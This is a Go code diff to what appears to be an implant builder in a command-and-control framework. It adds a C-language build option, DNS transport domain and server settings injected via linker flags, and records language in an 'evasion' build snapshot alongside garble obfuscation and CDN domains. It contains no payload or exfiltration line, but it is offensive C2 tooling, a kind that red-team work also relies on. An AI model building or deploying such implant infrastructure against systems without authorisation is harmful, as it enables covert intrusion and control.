@@ -42,6 +42,7 @@ const (
 
 // BuildRequest contains all parameters needed to build an implant.
 type BuildRequest struct {
+	Language     string // "go" (default), "c"
 	OS           string // "windows", "linux", "darwin"
 	Arch         string // "amd64", "arm64"
 	Transport    string // "https", "dns"
@@ -50,6 +51,8 @@ type BuildRequest struct {
 	JitterPct    int32
 	Garble       bool
 	CDNDomain    string
+	DNSDomain    string
+	DNSServer    string
 	Format       Format
 	Operator     string
 	ImplantSecret string // hex-encoded
@@ -67,6 +70,17 @@ type BuildResult struct {
 
 // Build orchestrates the implant build process.
 func Build(req *BuildRequest) (*BuildResult, error) {
+	lang := req.Language
+	if lang == "" {
+		lang = "go"
+	}
+	if lang == "c" {
+		return BuildC(req)
+	}
+	if lang != "go" {
+		return nil, fmt.Errorf("unsupported implant language: %s (available: go, c)", lang)
+	}
+
 	if req.OS == "" {
 		req.OS = "windows"
 	}
@@ -141,6 +155,24 @@ func Build(req *BuildRequest) (*BuildResult, error) {
 
 	if req.CDNDomain != "" {
 		ldflags = append(ldflags, fmt.Sprintf("-X '%s/implant.cdnDomain=%s'", module, req.CDNDomain))
+	}
+	if req.Transport == "dns" {
+		if req.DNSDomain == "" {
+			return nil, fmt.Errorf("dns_domain required when transport=dns")
+		}
+		if !validDomainRe.MatchString(strings.TrimSuffix(req.DNSDomain, ".")) {
+			return nil, fmt.Errorf("invalid DNS domain: %s", req.DNSDomain)
+		}
+		if err := validateLdflagValue(req.DNSDomain, "DNSDomain"); err != nil {
+			return nil, err
+		}
+		ldflags = append(ldflags, fmt.Sprintf("-X '%s/implant.dnsDomain=%s'", module, req.DNSDomain))
+		if req.DNSServer != "" {
+			if err := validateLdflagValue(req.DNSServer, "DNSServer"); err != nil {
+				return nil, err
+			}
+			ldflags = append(ldflags, fmt.Sprintf("-X '%s/implant.dnsServer=%s'", module, req.DNSServer))
+		}
 	}
 
 	if req.CACertPath != "" {
@@ -275,7 +307,11 @@ func RecordBuild(store *db.Store, req *BuildRequest, result *BuildResult) error 
 	}
 
 	// L6: Populate evasion field with build config snapshot
-	evasion := fmt.Sprintf("format=%s,garble=%v", req.Format, req.Garble)
+	lang := req.Language
+	if lang == "" {
+		lang = "go"
+	}
+	evasion := fmt.Sprintf("language=%s,format=%s,garble=%v", lang, req.Format, req.Garble)
 	if req.CDNDomain != "" {
 		evasion += ",cdn=" + req.CDNDomain
 	}
